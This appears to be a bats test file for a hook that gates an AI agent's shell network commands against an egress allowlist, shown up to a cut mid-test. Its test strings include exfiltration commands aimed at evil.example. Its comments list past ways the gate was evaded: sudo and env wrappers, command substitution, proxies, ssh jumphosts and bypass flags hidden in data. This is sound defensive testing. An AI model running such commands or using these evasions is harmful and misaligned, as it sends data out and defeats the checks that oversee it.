#!/usr/bin/env bats
# tests/hooks/network-gate.bats
#
# OSS Trust A-2 — AC-2 coverage. `hooks/network-gate.sh` PreToolUse hook.
# Spec: docs/specs/network-egress-allowlist.md
# Parent: #122 OSS Trust epic
#
# Threat model: shell commands the agent issues can reach arbitrary hosts
# unless this hook blocks them. Composes with bash-denylist + approval-gate
# in the PreToolUse Bash chain (D-8 — all hooks must allow).
#
# I/O contract (Claude Code hook spec):
#   stdin:  JSON {"tool_name":"<name>","tool_input":{"command":"..."}}
#   stdout: JSON {"decision":"allow"|"block","reason":"..."}

setup() {
  REPO_ROOT="$(cd "$BATS_TEST_DIRNAME/../.." && pwd)"
  HOOK="$REPO_ROOT/hooks/network-gate.sh"
  [[ -f "$HOOK" ]] || skip "network-gate.sh not present"

  TMP_HOME="$(mktemp -d)"
  TMP_CFG="$TMP_HOME/.config/walter-os"
  mkdir -p "$TMP_CFG"
  export HOME="$TMP_HOME"
  export WALTER_CONFIG="$TMP_CFG"
  export WALTER_OS_HOME="$REPO_ROOT"
  ALLOWLIST="$TMP_CFG/egress-allowlist.txt"
  # Clear bypass env between tests.
  unset WALTER_EGRESS_ALLOW_OVERRIDE || true
}

teardown() {
  cd "$BATS_TEST_DIRNAME"
  case "$TMP_HOME" in
    /tmp/*|/var/folders/*|/var/tmp/*) rm -rf "$TMP_HOME" ;;
  esac
  true
}

# Helper: feed a PreToolUse JSON for a Bash command into the hook.
_call_hook_bash() {
  local cmd="$1"
  printf '{"tool_name":"Bash","tool_input":{"command":%s}}' \
    "$(printf '%s' "$cmd" | jq -Rs .)" \
    | bash "$HOOK"
}

# Helper: feed a non-Bash tool event (should always pass through).
_call_hook_other() {
  local tool="$1"
  printf '{"tool_name":"%s","tool_input":{}}' "$tool" | bash "$HOOK"
}

# ---------------------------------------------------------------------------
# Passthrough cases (no decision needed)
# ---------------------------------------------------------------------------

@test "AC-2: non-Bash tool calls pass through (allow)" {
  run _call_hook_other Read
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: Bash command with no network call passes through (allow)" {
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash "ls -la /tmp"
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: shell builtin / pipeline without a network CLI is allow" {
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash 'echo hello | grep h | wc -l'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Copilot R3): background '&' without spaces is split into segments" {
  # `true&curl ...` (no space before `&`) was previously tokenized as
  # one segment with CLI `true&curl` (unknown) → fell through to ALLOW
  # → bypassed the gate. Splitter now consumes `&` regardless of
  # surrounding whitespace (after `&&` is handled).
  : > "$ALLOWLIST"
  run _call_hook_bash 'true&curl https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Copilot R3): && (logical AND) is not mis-split into single &s" {
  # Pin that `&&` is still handled as the 2-char operator first, so a
  # chained `cd /tmp && curl ...` is split into two segments rather
  # than four (`cd /tmp`, ``, `curl ...`, ``).
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash 'cd /tmp && curl https://api.github.com/repos/foo'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

# ---------------------------------------------------------------------------
# curl + wget — extract host from URL
# ---------------------------------------------------------------------------

@test "AC-2: curl https://api.github.com (in allowlist) → allow" {
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash 'curl https://api.github.com/repos/foo/bar'
  echo "$output"
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: curl https://evil.example (empty allowlist) → block" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'curl https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -qE 'evil\.example|not in egress allowlist'
}

@test "AC-2: curl with flags before URL still extracts host" {
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash 'curl -X POST -H "Accept: application/json" https://api.github.com/issues'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Copilot R5): curl with double-quoted URL → quote stripped + allowed" {
  # CI scripts commonly quote URLs (`curl "$URL"`, `curl "https://..."`).
  # Without quote-stripping, the token was `"https://api.github.com/..."`
  # (literal quotes), the regex didn't match, and the hook fail-CLOSED
  # with "no extractable URL host" on legitimate use.
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash 'curl "https://api.github.com/repos/foo/bar"'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Copilot R5): curl with single-quoted URL → quote stripped + allowed" {
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash "curl 'https://api.github.com/repos/foo/bar'"
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Copilot R5): quoted URL pointing at non-allowlisted host still blocks" {
  # Verify the strip doesn't accidentally allow more — block path stays
  # active for non-allowlisted hosts even when quoted.
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash 'curl "https://evil.example/exfil"'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2: wget http://pypi.org → host extracted + checked" {
  echo 'pypi.org' > "$ALLOWLIST"
  run _call_hook_bash 'wget http://pypi.org/simple/foo'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: curl with no URL anywhere → fail-CLOSED (block)" {
  # This is an operator typo (`curl` alone). Fail-closed per spec.
  : > "$ALLOWLIST"
  run _call_hook_bash 'curl --help'
  [ "$status" -eq 0 ]
  # Either block ("can't extract host") OR allow (--help is harmless).
  # Spec AC-2 says fail-CLOSED on missing host for known network CLIs,
  # so we expect block. Operators who hit this run `curl --help` outside
  # the hook (it's a local-only command).
  echo "$output" | jq -e '.decision == "block"'
}

# ---------------------------------------------------------------------------
# Wildcard semantics inherited from the loader
# ---------------------------------------------------------------------------

@test "AC-2: wildcard subdomain match is honoured" {
  echo '*.openrouter.ai' > "$ALLOWLIST"
  run _call_hook_bash 'curl https://api.openrouter.ai/v1/chat'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: wildcard does NOT match apex (spec D-5)" {
  echo '*.openrouter.ai' > "$ALLOWLIST"
  run _call_hook_bash 'curl https://openrouter.ai/'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

# ---------------------------------------------------------------------------
# git — both https and ssh-style URLs
# ---------------------------------------------------------------------------

@test "AC-2: git clone https://github.com/... (allowlisted) → allow" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git clone https://github.com/foo/bar.git'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: git clone git@github.com:foo/bar (ssh-form) → host extracted" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git clone git@github.com:foo/bar.git'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: git push to a non-allowlisted remote → block" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git push https://gitlab.example/foo/bar HEAD:main'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2: local-only git subcommands (status, log, diff, cherry, branch) pass through" {
  # `git status` / `git log` / `git diff` / `git cherry` / `git branch`
  # are local-only. `git cherry` (R2 fix B4) was previously misclassified
  # as a network subcommand and blocked when invoked with no URL — pin
  # it as local here.
  echo 'github.com' > "$ALLOWLIST"
  for cmd in 'git status' 'git log --oneline -5' 'git diff' 'git cherry main' 'git branch -a'; do
    run _call_hook_bash "$cmd"
    [ "$status" -eq 0 ]
    echo "$output" | jq -e '.decision == "allow"' || { echo "expected allow for: $cmd → $output"; return 1; }
  done
}

@test "AC-2 (R2): 'git fetch' with no explicit URL → fail-CLOSED block" {
  # Behavior the previous test NAMED but never asserted. `git fetch`
  # with no remote uses the configured upstream — implicit host that
  # the parser can't see. Per spec AC-2, fail-CLOSED.
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git fetch'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -qE 'implicit remote|git fetch'
}

@test "AC-2 (R2 B5): 'git lfs push origin' with no URL → fail-CLOSED block" {
  # Without B5, `git lfs push origin main` falls to the catch-all ALLOW
  # branch and bypasses the gate completely. With B5, `lfs` is in the
  # network subcommand list and fails CLOSED on missing URL.
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git lfs push origin main'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (R2 B5): 'git svn fetch' / 'git annex get' fail-CLOSED" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git svn fetch'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  run _call_hook_bash 'git annex get bigfile.bin'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (R2 B5): 'git lfs push https://github.com/foo/bar' (allowlisted) → allow" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git lfs push https://github.com/foo/bar.git main'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

# ---------------------------------------------------------------------------
# R2 B1: sudo / env / nice / nohup wrappers must NOT bypass the gate
# ---------------------------------------------------------------------------

@test "AC-2 (R2 B1): 'sudo curl https://evil.example' is blocked" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'sudo curl https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (R2 B1): 'sudo -E curl https://evil.example' is blocked" {
  # Without the fix, `-E` was treated as the CLI name → fell to ALLOW.
  : > "$ALLOWLIST"
  run _call_hook_bash 'sudo -E curl https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (R2 B1): 'sudo -u nobody curl https://evil.example' is blocked" {
  # `-u nobody` is a flag+value pair; the unwrapper must consume both.
  : > "$ALLOWLIST"
  run _call_hook_bash 'sudo -u nobody curl https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (R2 B1): 'env FOO=bar curl https://evil.example' is blocked" {
  # env-style VAR=VAL assignments before the real CLI must also be
  # stripped so the parser sees `curl`.
  : > "$ALLOWLIST"
  run _call_hook_bash 'env FOO=bar curl https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (R2 B1): '/usr/bin/env curl https://api.github.com' with allowlist works" {
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash '/usr/bin/env curl https://api.github.com/repos/foo/bar'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (R2 B1): 'sudo -E' with NO followed CLI → fail-CLOSED" {
  # Pathological: sudo + flag and then EOL. Resulting cli is empty.
  : > "$ALLOWLIST"
  run _call_hook_bash 'sudo -E'
  [ "$status" -eq 0 ]
  # Empty cli → falls into the unable-to-identify branch (block).
  echo "$output" | jq -e '.decision == "block"'
}

# ---------------------------------------------------------------------------
# R2 W1: IPv6 literal URL host extraction
# ---------------------------------------------------------------------------

@test "AC-2 (R2 W1): IPv6 literal URL extracts bracketed host (allowlisted)" {
  echo '[::1]' > "$ALLOWLIST"
  run _call_hook_bash 'curl http://[::1]:8080/api'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (R2 W1): IPv6 literal URL extracts bracketed host (NOT in allowlist)" {
  # Without W1 fix, [ was returned as the "host", failing CLI validation
  # with a cryptic error. With the fix, the bracketed literal is treated
  # as the host and a clean block message comes back.
  : > "$ALLOWLIST"
  run _call_hook_bash 'curl http://[fd00::1]/api'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -q 'fd00::1'
}

# ---------------------------------------------------------------------------
# R2 B7: bypass flag in command DATA (JSON body) must NOT trigger bypass
# ---------------------------------------------------------------------------

@test "AC-2 (R2 B7): bypass flag inside a JSON body does NOT trigger bypass" {
  # The flag must be SPACE-BRACKETED to count as a real CLI token.
  # In `curl -d '{"x":"--allow-egress-outbound"}' https://evil.example`,
  # the flag is bracketed by `"` not whitespace, so the regex
  # `(^|[[:space:]])--allow-egress-outbound([[:space:]]|$)` does NOT
  # match → bypass does NOT fire → curl-to-evil is BLOCKED.
  : > "$ALLOWLIST"
  export WALTER_EGRESS_ALLOW_OVERRIDE=1
  run _call_hook_bash 'curl -d "{\"flag\":\"--allow-egress-outbound\"}" https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"' || { echo "expected block (flag in JSON body), got: $output"; return 1; }
}

@test "AC-2 (R2 B7): bypass flag as real CLI token DOES trigger bypass" {
  # The legitimate operator-typed form: `... --allow-egress-outbound`
  # with whitespace boundary → the bypass DOES fire.
  : > "$ALLOWLIST"
  export WALTER_EGRESS_ALLOW_OVERRIDE=1
  run _call_hook_bash 'curl https://emergency.example/healthcheck --allow-egress-outbound'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

# ---------------------------------------------------------------------------
# gh — implicit github.com / GH_HOST
# ---------------------------------------------------------------------------

@test "AC-2: gh pr create with github.com allowlisted → allow" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'gh pr create --title "[FEAT] -TECHNICAL- foo" --body bar'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: gh pr create with github.com NOT allowlisted → block" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'gh pr create --title x --body y'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

# ---------------------------------------------------------------------------
# ssh / scp — extract user@host
# ---------------------------------------------------------------------------

@test "AC-2: ssh user@host with host allowlisted → allow" {
  echo 'walter-vm.tail.example' > "$ALLOWLIST"
  run _call_hook_bash 'ssh nico@walter-vm.tail.example ls /tmp'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: ssh host (no user) with host allowlisted → allow" {
  echo 'walter-vm.tail.example' > "$ALLOWLIST"
  run _call_hook_bash 'ssh walter-vm.tail.example uptime'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2: scp file user@host:/path with host allowlisted → allow" {
  echo 'walter-vm.tail.example' > "$ALLOWLIST"
  run _call_hook_bash 'scp ./file.txt nico@walter-vm.tail.example:/tmp/'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Copilot R2): scp with bare host:/abs/path (no user) extracts host" {
  # Common scp form: absolute remote path. Previous regex required
  # non-`/` after `:` and failed CLOSED on legitimate use. Fix admits
  # both `host:foo` (relative) and `host:/abs/path` (absolute).
  echo 'walter-vm.tail.example' > "$ALLOWLIST"
  run _call_hook_bash 'scp ./file.txt walter-vm.tail.example:/tmp/'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Copilot R2): scp with bare host:relpath (no user) extracts host" {
  echo 'walter-vm.tail.example' > "$ALLOWLIST"
  run _call_hook_bash 'scp ./file.txt walter-vm.tail.example:relpath'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Copilot R3): scp with Windows-drive path → fail-CLOSED block (no host)" {
  # `C:/Users/foo` is a Windows drive path, NOT `host:path`. The
  # _host_from_hostpath heuristic rejects single-letter `X:[\\/]`
  # explicitly. Since the scp command has NO extractable host on the
  # CLI, the hook falls into the "scp without an extractable host"
  # fail-CLOSED branch — pinning that behavior so a future refactor
  # accidentally treating `C` as a host fails this test.
  echo 'walter-vm.tail.example' > "$ALLOWLIST"
  run _call_hook_bash 'scp ./file.txt C:/Users/foo'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -qE 'extractable host|scp'
}

# ---------------------------------------------------------------------------
# Copilot R2 F2: git remote -v / submodule status / archive (no --remote)
# are LOCAL operations and must pass through
# ---------------------------------------------------------------------------

@test "AC-2 (Copilot R2): 'git remote -v' passes through (LOCAL)" {
  # `git remote -v` lists configured remotes from local .git/config.
  # No network. Previous list included `remote` → blocked as "implicit
  # remote". Fixed by removing remote from the network subcommand list.
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git remote -v'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Copilot R2): 'git submodule status' passes through (LOCAL)" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git submodule status'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Codex CR8-B): 'git remote update <name>' fail-CLOSED (network sub-sub)" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git remote update origin'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR8-B): 'git remote show <name>' fail-CLOSED (network sub-sub)" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git remote show origin'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR8-B): 'git remote add evil https://evil.example/repo' blocks (URL inspected at add)" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git remote add evil https://evil.example/repo.git'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -q 'evil.example'
}

@test "AC-2 (Codex CR8-B): 'git remote add allowed https://github.com/x' (allowlisted) → allow" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git remote add allowed https://github.com/foo/bar.git'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Codex CR8-B): 'git remote rm origin' (local) passes through" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git remote rm origin'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Codex CR8-B): 'git submodule update --remote' fail-CLOSED (network)" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git submodule update --remote'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR8-B): 'git submodule add https://evil/x' blocks unallowlisted URL" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git submodule add https://evil.example/repo.git path/to/sub'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR8-B): 'git submodule init' (local) passes through" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git submodule init'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

# ---------------------------------------------------------------------------
# Codex R8 CR8-A: curl proxy flags must validate the proxy host
# ---------------------------------------------------------------------------

@test "AC-2 (Codex CR8-A): 'curl --proxy=http://evil https://allowed' blocks proxy host" {
  # The URL is allowlisted but the proxy isn't — connection goes to
  # proxy first → exfil risk → block.
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash 'curl --proxy=http://evil.example:8080 https://api.github.com/x'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -q 'evil.example'
}

@test "AC-2 (Codex CR8-A): 'curl --proxy http://evil https://allowed' (spaced) blocks" {
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash 'curl --proxy http://evil.example:8080 https://api.github.com/x'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR8-A): 'curl -x evil.example:8080 https://allowed' (bare host:port) blocks" {
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash 'curl -x evil.example:8080 https://api.github.com/x'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex CR8-A): 'curl --proxy=http://allowed-proxy https://allowed' allows both" {
  printf '%s\n' 'api.github.com' 'proxy.example' > "$ALLOWLIST"
  run _call_hook_bash 'curl --proxy=http://proxy.example:8080 https://api.github.com/x'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Copilot R2): 'git archive HEAD -o /tmp/out.tar' (no --remote) passes through" {
  # Local archive form. Must NOT be blocked.
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git archive HEAD -o /tmp/out.tar'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Copilot R2): 'git archive --remote=https://github.com/x/y.git HEAD' requires URL host" {
  # Network form. Must check the URL against the allowlist.
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git archive --remote=https://github.com/foo/bar.git HEAD'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Copilot R2): 'git archive --remote=https://evil.example/x' blocks unallowlisted host" {
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git archive --remote=https://evil.example/foo HEAD'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (R6 F20): 'git archive --remote URL' space-separated form is validated" {
  # Previously only the `=`-form was handled; space-form fail-CLOSED
  # even when the URL was right there. Now both forms work.
  echo 'github.com' > "$ALLOWLIST"
  run _call_hook_bash 'git archive --remote https://github.com/foo/bar.git HEAD'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
  run _call_hook_bash 'git archive --remote https://evil.example/foo HEAD'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

# ---------------------------------------------------------------------------
# R6 F21: ssh -J ProxyJump host validation
# ---------------------------------------------------------------------------

@test "AC-2 (R6 F21): 'ssh -J jumphost target' validates BOTH hosts" {
  # Previously -J was treated as a value-taking flag whose value (the
  # jumphost) was eaten unchecked. That let an attacker reach
  # evil.example via `ssh -J evil.example allowed.example`. Now the
  # jumphost is checked too.
  printf '%s\n' 'allowed.example' 'jumphost.example' > "$ALLOWLIST"
  run _call_hook_bash 'ssh -J jumphost.example allowed.example uptime'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (R6 F21): 'ssh -J evil.example allowed.example' is BLOCKED (jumphost not allowlisted)" {
  echo 'allowed.example' > "$ALLOWLIST"
  run _call_hook_bash 'ssh -J evil.example allowed.example uptime'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -q 'evil.example'
}

@test "AC-2 (R6 F21): 'ssh -J chain1.example,chain2.example target' checks every jump" {
  printf '%s\n' 'target.example' 'chain1.example' > "$ALLOWLIST"
  # chain2 is missing from the allowlist — must block.
  run _call_hook_bash 'ssh -J chain1.example,chain2.example target.example uptime'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -q 'chain2.example'
}

# ---------------------------------------------------------------------------
# R6 F22: sudo -N / -S are VALUELESS — don't eat the next token
# ---------------------------------------------------------------------------

@test "AC-2 (R6 F22): 'sudo -S curl https://evil.example' is blocked" {
  # Previously -S was in the value-taking list → `curl` got eaten as
  # `-S`'s value → URL became the new "cli" → unknown → ALLOW (bypass).
  : > "$ALLOWLIST"
  run _call_hook_bash 'sudo -S curl https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (R6 F22): 'sudo -N curl https://evil.example' is blocked" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'sudo -N curl https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

# ---------------------------------------------------------------------------
# R6 F19: token-aware bypass detection (xargs path)
# ---------------------------------------------------------------------------

@test "AC-2 (R6 F19): bypass flag inside a SINGLE-quoted string body does NOT trigger bypass" {
  # `curl 'a b --allow-egress-outbound c d' https://evil.example` —
  # the flag is part of a larger single-quoted token, so xargs emits
  # one line `a b --allow-egress-outbound c d` (not the literal flag).
  # `grep -qxF` requires EXACT line match → bypass does NOT fire →
  # the curl-to-evil is blocked.
  : > "$ALLOWLIST"
  export WALTER_EGRESS_ALLOW_OVERRIDE=1
  run _call_hook_bash "curl 'a b --allow-egress-outbound c d' https://evil.example/exfil"
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2: bypass flag does NOT trigger when shellword tokenization fails" {
  # If xargs cannot parse shell words (for example, unmatched quotes), the
  # bypass must remain disabled rather than falling back to regex matching.
  # This keeps prompt-controlled data from looking like an operator-typed
  # bypass flag.
  : > "$ALLOWLIST"
  export WALTER_EGRESS_ALLOW_OVERRIDE=1
  run _call_hook_bash "curl -d 'body --allow-egress-outbound https://evil.example/exfil"
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (R6 F19): bypass flag as standalone CLI token still DOES trigger bypass" {
  # The legitimate operator-typed form: `... --allow-egress-outbound`
  # is a real shell token → bypass DOES fire.
  : > "$ALLOWLIST"
  export WALTER_EGRESS_ALLOW_OVERRIDE=1
  run _call_hook_bash 'curl https://emergency.example/healthcheck --allow-egress-outbound'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

# ---------------------------------------------------------------------------
# pip / npm / uvx / cargo — implicit-host fail-CLOSED
# ---------------------------------------------------------------------------

@test "AC-2: pip install foo (implicit registry) → fail-CLOSED block" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'pip install requests'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -qE 'implicit host|index-url|registry'
}

@test "AC-2 (Codex C1): 'npm install --registry=https://X' parses host from inside flag-value" {
  # Previously --registry=https://registry.npmjs.org was a single token;
  # _host_from_url anchored on ^scheme:// failed to match. Pip/npm/etc.
  # case now peels --<flag>=VALUE before extraction.
  echo 'registry.npmjs.org' > "$ALLOWLIST"
  run _call_hook_bash 'npm install left-pad --registry=https://registry.npmjs.org'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Codex C1): 'pip install --index-url=https://X foo' parses host from flag-value" {
  echo 'pypi.org' > "$ALLOWLIST"
  run _call_hook_bash 'pip install --index-url=https://pypi.org/simple requests'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Codex C1): 'pip install --index-url=https://evil.example foo' STILL blocks non-allowlisted host" {
  echo 'pypi.org' > "$ALLOWLIST"
  run _call_hook_bash 'pip install --index-url=https://evil.example/simple requests'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

# ---------------------------------------------------------------------------
# Codex C2: quote-aware segment splitting
# ---------------------------------------------------------------------------

@test "AC-2 (Codex C2): single-quoted URL with & in query string stays one segment" {
  # Previously `&`-split tokenized this as TWO segments:
  #   curl 'https://api.github.com/x?q=a
  #   per_page=1'
  # First missing closing quote → host extraction failed → block. Now
  # quote-aware split keeps the URL intact + host extracts cleanly.
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash "curl 'https://api.github.com/search?q=foo&per_page=1'"
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Codex C2): double-quoted URL with & in query string stays one segment" {
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash 'curl "https://api.github.com/search?q=foo&per_page=1"'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

@test "AC-2 (Codex C2): unquoted '&' between commands STILL splits (R3 fix preserved)" {
  # The R3 bypass case must still be blocked — `&` outside quotes is a
  # real separator + the second segment must be inspected.
  : > "$ALLOWLIST"
  run _call_hook_bash 'true&curl https://evil.example/exfil'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
}

@test "AC-2 (Codex C2): '&&' chain still splits correctly" {
  echo 'api.github.com' > "$ALLOWLIST"
  run _call_hook_bash 'cd /tmp && curl https://api.github.com/x'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "allow"'
}

# ---------------------------------------------------------------------------
# Codex R3 CR2-A: command / process / backtick substitution must be
# inspected too. Previously `echo $(curl evil.example)` allowed because
# cli=`echo` and the curl inside `$(…)` was invisible.
# ---------------------------------------------------------------------------

@test "AC-2 (Codex CR2-A): \$(...) substitution with curl inside is BLOCKED" {
  : > "$ALLOWLIST"
  run _call_hook_bash 'echo $(curl https://evil.example/exfil)'
  [ "$status" -eq 0 ]
  echo "$output" | jq -e '.decision == "block"'
  echo "$output" | jq -er '.reason' | grep -q 'evil.example'
}

@test "AC-2 (Codex CR2-A): \$(...) substitution with allowlisted host is allowed" {
  echo 'api.github.com' > "$ALLOWLIST"
